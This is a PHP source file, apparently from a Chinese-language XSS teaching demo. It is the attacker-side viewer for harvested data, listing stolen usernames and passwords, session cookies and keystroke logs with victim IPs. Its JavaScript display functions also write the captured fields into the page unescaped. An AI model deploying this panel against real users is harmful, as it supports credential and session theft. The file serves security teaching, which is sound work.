<?php
/**
 * 数据查看器 - 整合版
 * 包含凭据查看、Cookie查看、键盘记录三个分页
 * 
 * @author  Guojin0826
 * @email   jinrcsy@gmail.com
 * @github  https://github.com/Guojin0826
 */

// 数据文件路径
$credentialsFile = __DIR__ . '/data/stolen_credentials.txt';
$cookiesFile = __DIR__ . '/data/stolen_cookies.txt';
$keylogFile = __DIR__ . '/data/keylog.txt';

// 读取凭据数据
$credentials = [];
if (file_exists($credentialsFile)) {
    $content = file_get_contents($credentialsFile);
    if (!empty($content)) {
        $credentials = json_decode($content, true) ?: [];
    }
}

// 读取Cookie数据
$cookies = [];
if (file_exists($cookiesFile)) {
    $content = file_get_contents($cookiesFile);
    $entries = explode("========================================\n", $content);
    $entries = array_filter(array_map('trim', $entries));
    foreach ($entries as $entry) {
        $cookies[] = $entry;
    }
    $cookies = array_reverse($cookies);
}

// 读取键盘记录
$keylogs = [];
if (file_exists($keylogFile)) {
    $content = file_get_contents($keylogFile);
    if (!empty($content)) {
        $keylogs = json_decode($content, true) ?: [];
    }
}
$keylogs = array_reverse($keylogs);

// 统计数据
$credCount = count($credentials);
$cookieCount = count($cookies);
$keylogCount = count($keylogs);

// 获取当前标签页
$activeTab = isset($_GET['tab']) ? $_GET['tab'] : 'credentials';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>数据查看器 - XSS演示平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Microsoft YaHei', 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* 顶部导航 */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .header h1 {
            color: #e94560;
            font-size: 28px;
        }
        
        .btn-back {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 24px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-back:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }
        
        /* 警告横幅 */
        .warning-banner {
            background: rgba(233, 69, 96, 0.2);
            border: 1px solid #e94560;
            border-radius: 10px;
            padding: 15px 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        /* 统计卡片 */
        .stats-overview {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .stat-card {
            background: rgba(78, 205, 196, 0.1);
            border: 1px solid #4ecdc4;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 20px rgba(78, 205, 196, 0.3);
        }
        
        .stat-card.active {
            background: rgba(78, 205, 196, 0.25);
            border-color: #fff;
        }
        
        .stat-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .stat-number {
            font-size: 36px;
            color: #4ecdc4;
            font-weight: bold;
        }
        
        .stat-label {
            color: #aaa;
            margin-top: 5px;
            font-size: 14px;
        }
        
        /* 标签页导航 */
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.3);
            padding: 5px;
            border-radius: 12px;
            flex-wrap: wrap;
        }
        
        .tab-btn {
            flex: 1;
            min-width: 150px;
            padding: 15px 25px;
            border: none;
            background: transparent;
            color: #aaa;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            border-radius: 10px;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .tab-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
        }
        
        .tab-btn.active {
            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.4);
        }
        
        .tab-btn .badge {
            background: rgba(255, 255, 255, 0.2);
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 12px;
        }
        
        .tab-btn.active .badge {
            background: rgba(255, 255, 255, 0.3);
        }
        
        /* 内容区域 */
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* 操作按钮 */
        .actions-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .actions-bar h2 {
            color: #4ecdc4;
        }
        
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-refresh {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-auto {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
        }
        
        .btn-clear {
            background: linear-gradient(135deg, #e94560 0%, #ff6b6b 100%);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        /* 数据列表容器 */
        .data-container {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 20px;
        }
        
        /* 数据项样式 */
        .data-item {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            border-left: 4px solid #e94560;
        }
        
        .data-item:last-child {
            margin-bottom: 0;
        }
        
        .data-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .data-time {
            color: #4ecdc4;
            font-weight: bold;
        }
        
        .data-ip {
            color: #ff6b6b;
            font-size: 14px;
        }
        
        .data-detail {
            display: grid;
            grid-template-columns: auto 1fr;
            gap: 8px 15px;
            font-size: 14px;
        }
        
        .data-label {
            color: #aaa;
        }
        
        .data-value {
            color: #fff;
            word-break: break-all;
        }
        
        .data-value.highlight {
            color: #e94560;
            font-weight: bold;
        }
        
        /* Cookie内容样式 */
        .cookie-content {
            background: #0d1117;
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            color: #00ff00;
            font-size: 13px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
        }
        
        /* 键盘记录样式 */
        .keylog-content {
            background: #0d1117;
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            color: #ff6b6b;
            font-size: 16px;
            line-height: 1.6;
        }
        
        .key-space {
            background: rgba(78, 205, 196, 0.3);
            padding: 2px 10px;
            border-radius: 3px;
            margin: 0 2px;
        }
        
        .key-enter {
            background: rgba(255, 107, 107, 0.5);
            padding: 2px 8px;
            border-radius: 3px;
            margin: 0 2px;
        }
        
        .key-special {
            background: rgba(233, 69, 96, 0.3);
            padding: 2px 6px;
            border-radius: 3px;
            margin: 0 2px;
        }
        
        /* 空状态 */
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #aaa;
        }
        
        .empty-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        
        /* 自动刷新指示器 */
        .auto-refresh-indicator {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(17, 153, 142, 0.2);
            color: #38ef7d;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 13px;
        }
        
        .auto-refresh-indicator.hidden {
            display: none;
        }
        
        .spinner {
            width: 14px;
            height: 14px;
            border: 2px solid #38ef7d;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* 响应式 */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 22px;
            }
            
            .stat-card {
                padding: 15px;
            }
            
            .stat-number {
                font-size: 28px;
            }
            
            .tab-btn {
                padding: 12px 15px;
                font-size: 14px;
            }
            
            .data-detail {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 顶部导航 -->
        <div class="header">
            <h1>🔍 XSS攻击数据查看器</h1>
            <a href="demo.php" class="btn-back">
                <span>🏠</span>
                <span>返回演示首页</span>
            </a>
        </div>
        
        <!-- 警告横幅 -->
        <div class="warning-banner">
            ⚠️ <strong>警告</strong>：此页面仅用于安全教学演示！展示XSS攻击的危害性，请勿用于非法用途。
        </div>
        
        <!-- 统计概览 -->
        <div class="stats-overview">
            <div class="stat-card <?php echo $activeTab === 'credentials' ? 'active' : ''; ?>" onclick="switchTab('credentials')">
                <div class="stat-icon">🔐</div>
                <div class="stat-number"><?php echo $credCount; ?></div>
                <div class="stat-label">窃取凭据</div>
            </div>
            <div class="stat-card <?php echo $activeTab === 'cookies' ? 'active' : ''; ?>" onclick="switchTab('cookies')">
                <div class="stat-icon">🍪</div>
                <div class="stat-number"><?php echo $cookieCount; ?></div>
                <div class="stat-label">窃取Cookie</div>
            </div>
            <div class="stat-card <?php echo $activeTab === 'keylogs' ? 'active' : ''; ?>" onclick="switchTab('keylogs')">
                <div class="stat-icon">⌨️</div>
                <div class="stat-number"><?php echo $keylogCount; ?></div>
                <div class="stat-label">键盘记录</div>
            </div>
        </div>
        
        <!-- 标签页导航 -->
        <div class="tabs">
            <button class="tab-btn <?php echo $activeTab === 'credentials' ? 'active' : ''; ?>" onclick="switchTab('credentials')">
                <span>🔐</span>
                <span>凭据查看</span>
                <span class="badge"><?php echo $credCount; ?></span>
            </button>
            <button class="tab-btn <?php echo $activeTab === 'cookies' ? 'active' : ''; ?>" onclick="switchTab('cookies')">
                <span>🍪</span>
                <span>Cookie查看</span>
                <span class="badge"><?php echo $cookieCount; ?></span>
            </button>
            <button class="tab-btn <?php echo $activeTab === 'keylogs' ? 'active' : ''; ?>" onclick="switchTab('keylogs')">
                <span>⌨️</span>
                <span>键盘记录</span>
                <span class="badge"><?php echo $keylogCount; ?></span>
            </button>
        </div>
        
        <!-- 凭据查看 -->
        <div id="credentials-tab" class="tab-content <?php echo $activeTab === 'credentials' ? 'active' : ''; ?>">
            <div class="actions-bar">
                <h2>📋 窃取的凭据列表</h2>
                <div class="btn-group">
                    <button class="btn btn-refresh" onclick="loadCredentials()">🔄 刷新数据</button>
                    <button class="btn btn-clear" onclick="clearCredentials()">🗑️ 清空数据</button>
                </div>
            </div>
            <div class="data-container" id="credentialsContainer">
                <?php if (empty($credentials)): ?>
                    <div class="empty-state">
                        <div class="empty-icon">📭</div>
                        <p>暂无窃取的凭据</p>
                        <p style="margin-top: 10px; font-size: 14px;">请先在钓鱼演示页面进行测试</p>
                    </div>
                <?php else: ?>
                    <?php foreach ($credentials as $index => $cred): ?>
                        <div class="data-item">
                            <div class="data-header">
                                <span class="data-time">🕐 <?php echo htmlspecialchars($cred['time'] ?? $cred['timestamp'] ?? '未知时间'); ?></span>
                                <span class="data-ip">🌐 IP: <?php echo htmlspecialchars($cred['ip'] ?? '未知'); ?></span>
                            </div>
                            <div class="data-detail">
                                <div class="data-label">用户名：</div>
                                <div class="data-value"><?php echo htmlspecialchars($cred['username'] ?? '未知'); ?></div>
                                <div class="data-label">密码：</div>
                                <div class="data-value highlight"><?php echo htmlspecialchars($cred['password'] ?? '未知'); ?></div>
                                <div class="data-label">来源页面：</div>
                                <div class="data-value"><?php echo htmlspecialchars($cred['referer'] ?? '直接访问'); ?></div>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
        
        <!-- Cookie查看 -->
        <div id="cookies-tab" class="tab-content <?php echo $activeTab === 'cookies' ? 'active' : ''; ?>">
            <div class="actions-bar">
                <h2>📋 窃取的Cookie列表</h2>
                <div class="btn-group">
                    <button class="btn btn-refresh" onclick="location.reload()">🔄 刷新数据</button>
                    <button class="btn btn-auto" id="autoRefreshBtn" onclick="toggleAutoRefresh()">
                        ▶️ 开启自动刷新
                    </button>
                    <button class="btn btn-clear" onclick="clearCookies()">🗑️ 清空数据</button>
                    <div class="auto-refresh-indicator hidden" id="autoRefreshIndicator">
                        <div class="spinner"></div>
                        <span>自动刷新中...</span>
                    </div>
                </div>
            </div>
            <div class="data-container" id="cookiesContainer">
                <?php if (empty($cookies)): ?>
                    <div class="empty-state">
                        <div class="empty-icon">📭</div>
                        <p>暂无窃取的Cookie</p>
                        <p style="margin-top: 10px; font-size: 14px;">请先在Cookie窃取演示页面进行测试</p>
                    </div>
                <?php else: ?>
                    <?php foreach ($cookies as $index => $cookie): ?>
                        <?php if (empty(trim($cookie))) continue; ?>
                        <div class="data-item">
                            <div class="data-header">
                                <span class="data-time">🕐 
                                    <?php 
                                    if (preg_match('/时间: (.+)/', $cookie, $matches)) {
                                        echo htmlspecialchars($matches[1]);
                                    } else {
                                        echo '未知时间';
                                    }
                                    ?>
                                </span>
                                <span class="data-ip">🌐 
                                    <?php 
                                    if (preg_match('/IP: (.+)/', $cookie, $matches)) {
                                        echo htmlspecialchars($matches[1]);
                                    } else {
                                        echo '未知';
                                    }
                                    ?>
                                </span>
                            </div>
                            <div class="cookie-content"><?php echo htmlspecialchars($cookie); ?></div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
        
        <!-- 键盘记录 -->
        <div id="keylogs-tab" class="tab-content <?php echo $activeTab === 'keylogs' ? 'active' : ''; ?>">
            <div class="actions-bar">
                <h2>📋 键盘记录列表</h2>
                <div class="btn-group">
                    <button class="btn btn-refresh" onclick="loadKeylogs()">🔄 刷新数据</button>
                    <button class="btn btn-clear" onclick="clearKeylogs()">🗑️ 清空数据</button>
                </div>
            </div>
            <div class="data-container" id="keylogsContainer">
                <?php if (empty($keylogs)): ?>
                    <div class="empty-state">
                        <div class="empty-icon">📭</div>
                        <p>暂无键盘记录</p>
                        <p style="margin-top: 10px; font-size: 14px;">请先在键盘记录演示页面进行测试</p>
                    </div>
                <?php else: ?>
                    <?php foreach ($keylogs as $index => $log): ?>
                        <div class="data-item">
                            <div class="data-header">
                                <span class="data-time">🕐 <?php echo htmlspecialchars($log['timestamp'] ?? '未知时间'); ?></span>
                                <span class="data-ip">🌐 IP: <?php echo htmlspecialchars($log['ip'] ?? '未知'); ?></span>
                            </div>
                            <div class="keylog-content">
                                <?php 
                                $keys = $log['keys'] ?? '';
                                $formatted = htmlspecialchars($keys);
                                $formatted = str_replace('[Space]', '<span class="key-space">␣</span>', $formatted);
                                $formatted = str_replace('[Enter]', '<span class="key-enter">↵</span>', $formatted);
                                $formatted = str_replace('[Tab]', '<span class="key-special">Tab</span>', $formatted);
                                $formatted = str_replace('[Backspace]', '<span class="key-special">⌫</span>', $formatted);
                                echo $formatted;
                                ?>
                            </div>
                            <?php if (!empty($log['fields'])): ?>
                                <div style="margin-top: 10px; padding: 10px; background: rgba(78, 205, 196, 0.1); border-radius: 5px;">
                                    <strong style="color: #4ecdc4;">📋 表单字段记录:</strong><br>
                                    <?php foreach ($log['fields'] as $fieldName => $fieldValue): ?>
                                        <div style="margin-top: 5px;">
                                            <span style="color: #aaa;"><?php echo htmlspecialchars($fieldName); ?>:</span>
                                            <span style="color: #ff6b6b; font-weight: bold;"><?php echo htmlspecialchars($fieldValue); ?></span>
                                        </div>
                                    <?php endforeach; ?>
                                </div>
                            <?php endif; ?>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </div>
    
    <script>
        // 标签页切换
        function switchTab(tab) {
            // 更新URL
            history.pushState(null, '', '?tab=' + tab);
            
            // 更新标签页按钮状态
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelectorAll('.stat-card').forEach(card => card.classList.remove('active'));
            
            // 激活对应标签
            document.querySelectorAll('.tab-btn').forEach(btn => {
                if (btn.onclick.toString().includes(tab)) {
                    btn.classList.add('active');
                }
            });
            document.querySelectorAll('.stat-card').forEach((card, index) => {
                if ((tab === 'credentials' && index === 0) ||
                    (tab === 'cookies' && index === 1) ||
                    (tab === 'keylogs' && index === 2)) {
                    card.classList.add('active');
                }
            });
            
            // 切换内容
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            document.getElementById(tab + '-tab').classList.add('active');
        }
        
        // 加载凭据数据
        function loadCredentials() {
            fetch('data/stolen_credentials.txt')
                .then(response => response.json())
                .then(data => {
                    displayCredentials(data);
                })
                .catch(error => {
                    console.log('加载凭据数据失败');
                });
        }
        
        function displayCredentials(data) {
            const container = document.getElementById('credentialsContainer');
            if (!data || data.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">📭</div>
                        <p>暂无窃取的凭据</p>
                    </div>
                `;
                return;
            }
            
            let html = '';
            data.reverse().forEach((item, index) => {
                html += `
                    <div class="data-item">
                        <div class="data-header">
                            <span class="data-time">🕐 ${item.time || item.timestamp || '未知时间'}</span>
                            <span class="data-ip">🌐 IP: ${item.ip || '未知'}</span>
                        </div>
                        <div class="data-detail">
                            <div class="data-label">用户名：</div>
                            <div class="data-value">${item.username || '未知'}</div>
                            <div class="data-label">密码：</div>
                            <div class="data-value highlight">${item.password || '未知'}</div>
                            <div class="data-label">来源页面：</div>
                            <div class="data-value">${item.referer || '直接访问'}</div>
                        </div>
                    </div>
                `;
            });
            container.innerHTML = html;
        }
        
        // 清空凭据
        function clearCredentials() {
            if (confirm('确定要清空所有窃取的凭据吗？')) {
                fetch('clear_credentials.php')
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'success') {
                            location.reload();
                        }
                    });
            }
        }
        
        // 清空Cookie
        function clearCookies() {
            if (confirm('确定要清空所有窃取的Cookie吗？')) {
                fetch('clear_cookies.php')
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'success') {
                            location.reload();
                        }
                    });
            }
        }
        
        // 加载键盘记录
        function loadKeylogs() {
            fetch('data/keylog.txt')
                .then(response => response.json())
                .then(data => {
                    displayKeylogs(data);
                })
                .catch(error => {
                    console.log('加载键盘记录失败');
                });
        }
        
        function displayKeylogs(data) {
            const container = document.getElementById('keylogsContainer');
            if (!data || data.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-icon">📭</div>
                        <p>暂无键盘记录</p>
                    </div>
                `;
                return;
            }
            
            let html = '';
            data.reverse().forEach((item, index) => {
                let keys = item.keys || '';
                let formatted = keys
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/\[Space\]/g, '<span class="key-space">␣</span>')
                    .replace(/\[Enter\]/g, '<span class="key-enter">↵</span>')
                    .replace(/\[Tab\]/g, '<span class="key-special">Tab</span>')
                    .replace(/\[Backspace\]/g, '<span class="key-special">⌫</span>');
                
                html += `
                    <div class="data-item">
                        <div class="data-header">
                            <span class="data-time">🕐 ${item.timestamp || '未知时间'}</span>
                            <span class="data-ip">🌐 IP: ${item.ip || '未知'}</span>
                        </div>
                        <div class="keylog-content">${formatted}</div>
                    </div>
                `;
            });
            container.innerHTML = html;
        }
        
        // 清空键盘记录
        function clearKeylogs() {
            if (confirm('确定要清空所有键盘记录吗？')) {
                fetch('clear_keylogs.php')
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'success') {
                            location.reload();
                        }
                    });
            }
        }
        
        // 自动刷新
        let autoRefreshInterval = null;
        
        function toggleAutoRefresh() {
            const btn = document.getElementById('autoRefreshBtn');
            const indicator = document.getElementById('autoRefreshIndicator');
            
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
                btn.innerHTML = '▶️ 开启自动刷新';
                indicator.classList.add('hidden');
            } else {
                autoRefreshInterval = setInterval(() => {
                    location.reload();
                }, 5000);
                btn.innerHTML = '⏸️ 关闭自动刷新';
                indicator.classList.remove('hidden');
            }
        }
        
        // 页面加载时根据URL参数切换标签
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const tab = urlParams.get('tab');
            if (tab) {
                switchTab(tab);
            }
        };
    </script>
</body>
</html>